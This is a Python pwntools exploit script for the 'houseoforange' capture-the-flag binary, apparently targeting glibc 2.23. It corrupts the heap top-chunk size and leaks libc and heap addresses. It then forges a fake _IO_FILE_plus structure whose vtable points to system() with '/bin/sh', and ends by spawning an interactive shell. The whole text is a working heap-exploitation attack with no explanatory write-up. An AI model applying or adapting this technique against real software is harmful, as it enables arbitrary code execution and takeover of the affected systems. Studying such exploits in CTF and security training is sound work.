from pwn import *
 
p = process('./houseoforange')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
def Build(len,name):
    p.recvuntil('Your choice : ')
    p.sendline('1')
    p.recvuntil('Length of name :')
    p.sendline(str(len))
    p.recvuntil('Name :')
    p.sendline(name)
    p.recvuntil('Price of Orange:')
    p.sendline(str(100))
    p.recvuntil('Color of Orange:')
    p.sendline(str(1))
 
def See():
    p.recvuntil('Your choice : ')
    p.sendline('2')
    tmp = p.recvuntil('Price')
    data = (tmp.split('\n')[1]).ljust(8,'\x00')
    return data
 
def Upgrade(len,name):
    p.recvuntil('Your choice : ')
    p.sendline('3')
    p.recvuntil('Length of name :')
    p.sendline(str(len))
    p.recvuntil('Name:')
    p.sendline(name)
    p.recvuntil('Price of Orange:')
    p.sendline(str(200))
    p.recvuntil('Color of Orange:')
    p.sendline(str(2))
 
Build(128,'HEAP')
 
#Change top size
payload = 'A' * 144
payload += p32(0xDEAD) + p32(0x20) + p64(0)
payload += p64(0) + p64(0xf31)
Upgrade(177,payload)
 
Build(4096,"HEAP")
 
#Leak Libc Address
Build(1024,"LEAKADD")
leakLibcAddr = u64(See())
libcAddrBase = leakLibcAddr - 0x3c5188
log.info('Leak Libc Addr : ' + hex(leakLibcAddr))
log.info('Leak Liba Addr Base : ' + hex(libcAddrBase))
 
#Leak Heap Address
Upgrade(1024,'B'*15)
leakHeapAddr = u64(See())
leakHeapAddr -= 0x130
log.info('Leak Heap Addr : ' + hex(leakHeapAddr))
 
#Payload Info
io_list_all = libcAddrBase + libc.symbols['_IO_list_all']
system = libcAddrBase + libc.symbols['system']
vtable = leakHeapAddr + 0x658
  
log.info('io_list_all : ' + hex(io_list_all))
log.info('system : ' + hex(system))
log.info('vtable : ' + hex(vtable))
 
payload = "C" * 1056
 
#Write to "Fake struct _IO_FILE_plus", " Fake struct _IO_wide_data"
stream = "/bin/sh\x00" + p64(0x61)
stream += p64(0xddaa) + p64(io_list_all-0x10)
stream = stream.ljust(0xa0,"\x00")
stream += p64(leakHeapAddr+0x700-0xd0)
stream = stream.ljust(0xc0,"\x00")
stream += p64(1)
 
payload += stream
payload += p64(0)*2
payload += p64(vtable)
payload += p64(1)
payload += p64(2)
payload += p64(3)
payload += p64(0)*3
payload += p64(system)
 
Upgrade(2048,payload)
 
p.recvuntil(":")
p.sendline("1")
  
p.interactive()
